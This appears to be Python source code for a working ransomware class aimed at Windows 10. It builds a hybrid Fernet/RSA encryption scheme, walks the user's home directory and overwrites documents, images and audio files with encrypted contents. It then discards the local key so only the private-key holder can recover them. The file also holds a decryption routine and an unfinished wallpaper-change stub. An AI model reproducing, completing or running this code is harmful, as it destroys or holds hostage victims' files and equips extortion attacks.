from cryptography.fernet import Fernet
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import os
import tkinter
import ctypes
import sys


class Ransomware:
    """Ransomware class for windows 10 systems"""
    
    file_extensions = ['.txt', '.pdf', '.png', 'jpg', '.jpeg', '.docx', '.xlsx', '.doc', '.rtf', '.mp3']

    def __init__(self):
        # Get Working Directory of application
        if getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'):
            os.chdir(sys._MEIPASS)
        self.fernetkey = None
        self.publickey = None
        self.encryptor = None
        self.localpath = os.environ['USERPROFILE']


    def create_fernet_key(self):
        self.fernetkey = Fernet.generate_key()
        self.encryptor = Fernet(self.fernetkey)


    def encrypt_fernet_key(self):
        # Import public key to encrypt and save fernet key to fernet.key
        with open('public.pem', 'rb') as f:
            self.publickey = RSA.import_key(f.read())
            
        PKenc = PKCS1_OAEP.new(self.publickey)
        with open('fernet.key', 'wb') as f:
            f.write(PKenc.encrypt(self.fernetkey))
    

    def decrypt_fernet_key(self, key_file):
        # Import private.pem and decrypt fernet.key
        private_key = RSA.importKey(open(key_file).read())
        cipher = PKCS1_OAEP.new(private_key)
        try:
            with open('fernet.key', 'rb') as f:
                decrypted_key = cipher.decrypt(f.read())
        except TypeError:
            return False #'Decryption failed, wrong private key.'
        
        with open('fernet.key', 'wb') as f:
            f.write(decrypted_key)
            self.encryptor = Fernet(decrypted_key)
        return True

        
    def encrypt_os(self):
        # Traverse Home directory and encrypt every file with selected extensions.
        for root, dirs, files in os.walk(self.localpath):
            if 'AppData' in root or '.vscode' in root:
                pass
            else:
                for file in files:
                    ext = os.path.splitext(file)[-1].lower()
                    if ext in self.file_extensions:
                        filepath = os.path.join(root, file)
                        # encrypt file:
                        with open(filepath, 'rb') as readf:
                            content = readf.read()
                        with open(filepath, 'wb') as writef:
                            writef.write(self.encryptor.encrypt(content))
        self.encryptor = None
        self.fernetkey = None
        

    def decrypt_os(self):
        # Reverse encryption of all files in Home directory
        for root, dirs, files in os.walk(self.localpath):
            if 'AppData' in root or '.vscode' in root:
                pass
            else:
                for file in files:
                    ext = os.path.splitext(file)[-1].lower()
                    if ext in self.file_extensions:
                        filepath = os.path.join(root, file)
                        # decrypt file:
                        with open(filepath, 'rb') as readf:
                            contents = readf.read()

                        with open(filepath, 'wb') as writef:
                            decfile = self.encryptor.decrypt(contents)
                            writef.write(decfile)

    
    def update_background(self):
        # not working atm... 
        ctypes.windll.user32.SystemParametersInfoW(20, 0, 'bg.png', 0)
        
